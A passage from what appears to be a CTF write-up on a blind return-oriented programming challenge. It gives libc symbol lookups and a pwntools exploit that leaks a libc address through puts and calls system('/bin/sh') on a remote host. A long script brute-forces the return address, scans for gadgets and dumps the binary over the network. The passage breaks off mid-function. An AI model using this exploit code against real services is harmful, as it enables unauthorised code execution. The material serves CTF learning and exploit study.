</pre></table></code></div></div><p>We know that the <code class="language-plaintext highlighter-rouge">last 3 nibbles</code> of these values will remain <code class="language-plaintext highlighter-rouge">constant</code> throughout multiple connections so we can crosscheck this nibbles with the last 3 nibbles of some functions in the <code class="language-plaintext highlighter-rouge">libc</code> file provided. We see that the function <code class="language-plaintext highlighter-rouge">puts</code> ends with <code class="language-plaintext highlighter-rouge">0x6a0</code> meaning address of <code class="language-plaintext highlighter-rouge">puts</code> in memory is <code class="language-plaintext highlighter-rouge">0x601018</code>. We add this to our global variables.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>readelf <span class="nt">-s</span> ./libc-2.23.so | <span class="nb">grep</span> <span class="s2">"puts"</span>
   186: 000000000006f6a0   456 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
   404: 000000000006f6a0   456 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
   475: 000000000010bce0  1262 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.2.5
   651: 000000000010d690   703 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
  1097: 000000000006e040   354 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
  1611: 000000000006e040   354 FUNC    GLOBAL DEFAULT   13 _IO_fputs@@GLIBC_2.2.5
  2221: 00000000000782c0    95 FUNC    WEAK   DEFAULT   13 fputs_unlocked@@GLIBC_2.2.5
</pre></table></code></div></div><p>Here’s all the global variables we use</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">pwn</span>
<span class="c1"># Global Variables
</span><span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">ELF</span><span class="p">(</span><span class="s">"libc-2.23.so"</span><span class="p">)</span>
<span class="n">HOST</span> <span class="o">=</span> <span class="s">"34.159.129.6"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">30550</span>
<span class="n">OFFSET</span> <span class="o">=</span> <span class="mi">88</span>
<span class="n">BINARY_BASE</span> <span class="o">=</span> <span class="mh">0x400000</span>
<span class="n">RIP</span> <span class="o">=</span> <span class="mh">0x40070a</span>
<span class="n">DUMP_FUNC</span> <span class="o">=</span> <span class="n">BINARY_BASE</span> <span class="o">+</span> <span class="mi">1806</span>
<span class="n">LOOPBACK_FUNC</span> <span class="o">=</span> <span class="n">BINARY_BASE</span> <span class="o">+</span> <span class="mh">0x5c0</span>
<span class="n">BROP_GADGET</span> <span class="o">=</span> <span class="mh">0x4007ba</span>
<span class="n">CALL_PUTS</span> <span class="o">=</span> <span class="mh">0x400560</span>
<span class="n">PUTS_GOT</span> <span class="o">=</span> <span class="mh">0x601018</span>
</pre></table></code></div></div><h2 id="exploit">Exploit</h2><hr /><p>We have everything we need to craft our <code class="language-plaintext highlighter-rouge">ROP chain</code> we’ll call <code class="language-plaintext highlighter-rouge">puts@got</code> with <code class="language-plaintext highlighter-rouge">puts@plt</code> as its argument to leak <code class="language-plaintext highlighter-rouge">libc address</code> and then we’ll loop back to our original function to use the <code class="language-plaintext highlighter-rouge">buffer overflow</code> bug again and this time call <code class="language-plaintext highlighter-rouge">system('/bin/sh')</code> to drop a shell.</p><p>Here is the final exploit function -</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BROP_GADGET</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>  <span class="c1"># pop rdi
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PUTS_GOT</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">CALL_PUTS</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">LOOPBACK_FUNC</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="s">'all'</span><span class="p">)</span>
    <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Puts Leak: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
    <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Libc Address: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">binsh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\0</span><span class="s">'</span><span class="p">))</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BROP_GADGET</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>  <span class="c1"># pop rdi
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><h2 id="exploit-in-action">Exploit in Action</h2><h3 id="to-do">To do</h3><h2 id="my-complete-script">My Complete Script</h2><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">pwn</span>
<span class="c1"># Global Variables
</span><span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">ELF</span><span class="p">(</span><span class="s">"libc-2.23.so"</span><span class="p">)</span>
<span class="n">HOST</span> <span class="o">=</span> <span class="s">"34.159.129.6"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">30550</span>
<span class="n">OFFSET</span> <span class="o">=</span> <span class="mi">88</span>
<span class="n">BINARY_BASE</span> <span class="o">=</span> <span class="mh">0x400000</span>
<span class="n">RIP</span> <span class="o">=</span> <span class="mh">0x40070a</span>
<span class="n">DUMP_FUNC</span> <span class="o">=</span> <span class="n">BINARY_BASE</span> <span class="o">+</span> <span class="mi">1806</span>
<span class="n">LOOPBACK_FUNC</span> <span class="o">=</span> <span class="n">BINARY_BASE</span> <span class="o">+</span> <span class="mh">0x5c0</span>
<span class="n">BROP_GADGET</span> <span class="o">=</span> <span class="mh">0x4007ba</span>
<span class="n">CALL_PUTS</span> <span class="o">=</span> <span class="mh">0x400560</span>
<span class="n">PUTS_GOT</span> <span class="o">=</span> <span class="mh">0x601018</span>


<span class="k">def</span> <span class="nf">Test</span><span class="p">():</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'?</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BROP_GADGET</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>  <span class="c1"># pop rdi
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BINARY_BASE</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x40071f</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">BROP_GADGET</span> <span class="o">+</span> <span class="mi">9</span><span class="p">))</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="n">mssg</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">GetRipOffset</span><span class="p">():</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">offset</span>
        <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">()</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s">'No password'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">mssg</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">offset</span><span class="o">-</span><span class="mi">1</span>


<span class="k">def</span> <span class="nf">BruteRip</span><span class="p">():</span>
    <span class="n">rip</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="n">rip</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p8</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
            <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
            <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
            <span class="k">if</span> <span class="sa">b</span><span class="s">'No password'</span> <span class="ow">in</span> <span class="n">mssg</span><span class="p">:</span>
                <span class="n">rip</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p8</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
                <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"RIP: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">pwn</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">rip</span><span class="p">,</span> <span class="s">'all'</span><span class="p">)))</span>
                <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">break</span>
            <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">rip</span>


<span class="k">def</span> <span class="nf">ScanText</span><span class="p">():</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">):</span>
        <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Scanning: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">BINARY_BASE</span> <span class="o">+</span> <span class="n">i</span><span class="p">))</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BINARY_BASE</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">mssg</span> <span class="o">!=</span> <span class="sa">b</span><span class="s">'Are you blind my friend?</span><span class="se">\n</span><span class="s">'</span> <span class="ow">and</span> <span class="n">mssg</span> <span class="o">!=</span> <span class="sa">b</span><span class="s">'Are you blind my friend?'</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"Offset"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="s">"Addr"</span><span class="p">,</span> <span class="n">BINARY_BASE</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">mssg</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">FindBropGadget</span><span class="p">():</span>
    <span class="n">possible</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">BINARY_BASE</span><span class="p">,</span> <span class="n">BINARY_BASE</span><span class="o">+</span><span class="mh">0x1000</span><span class="p">):</span>
        <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Scanning: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>  <span class="c1"># Possible pop gadget
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># pop rbx
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># pop rbp
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># pop r12
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># pop r13
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># pop r14
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># pop r15
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">DUMP_FUNC</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.2</span><span class="p">)</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s">'Do not dump'</span> <span class="ow">in</span> <span class="n">mssg</span><span class="p">:</span>
            <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Found pop gadget at: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
            <span class="n">possible</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">possible</span>


<span class="k">def</span> <span class="nf">CheckBROP</span><span class="p">():</span>
    <span class="c1"># possible = [4196110, 4196282]
</span>    <span class="c1"># for i in possible:
</span>    <span class="c1">#     io = pwn.remote(HOST, PORT, level='critical')
</span>    <span class="c1">#     payload = b'A'*OFFSET
</span>    <span class="c1">#     payload += pwn.p64(i + 7)  # possilbe pop 2 gadget
</span>    <span class="c1">#     payload += pwn.p64(0)  # pop rsi
</span>    <span class="c1">#     payload += pwn.p64(0)  # pop r15
</span>    <span class="c1">#     payload += pwn.p64(DUMP_FUNC)
</span>    <span class="c1">#     io.send(payload)
</span>    <span class="c1">#     mssg = io.recv(0x1000, timeout=0.2)
</span>    <span class="c1">#     if b'Do not dump' in mssg:
</span>    <span class="c1">#         pwn.log.success("Found pop gadget at: " + hex(i))
</span>    <span class="c1">#     io.close()
</span>    <span class="n">possible</span> <span class="o">=</span> <span class="p">[</span><span class="mi">4196110</span><span class="p">,</span> <span class="mi">4196282</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">possible</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>  <span class="c1"># possilbe pop 2 gadget
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># pop rdi
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">DUMP_FUNC</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.2</span><span class="p">)</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s">'Do not dump'</span> <span class="ow">in</span> <span class="n">mssg</span><span class="p">:</span>
            <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Found pop gadget at: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">FindLeakFunc</span><span class="p">():</span>
    <span class="n">funcs</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">BINARY_BASE</span><span class="p">,</span> <span class="n">BINARY_BASE</span><span class="o">+</span><span class="mh">0x4000</span><span class="p">):</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BROP_GADGET</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>  <span class="c1"># pop rdi
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BINARY_BASE</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.2</span><span class="p">)</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s">'ELF'</span> <span class="ow">in</span> <span class="n">mssg</span><span class="p">:</span>
            <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Found leak func at: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
            <span class="n">funcs</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">funcs</span>


<span class="k">def</span> <span class="nf">LeakELF</span><span class="p">():</span>
    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'leak.elf'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="n">BINARY_BASE</span>
    <span class="k">while</span><span class="p">(</span><span class="n">offset</span> <span class="o">&lt;</span> <span class="n">BINARY_BASE</span> <span class="o">+</span> <span class="mh">0x4000</span><span class="p">):</span>
        <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"At offset: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BROP_GADGET</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>  <span class="c1"># pop rdi
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">CALL_PUTS</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
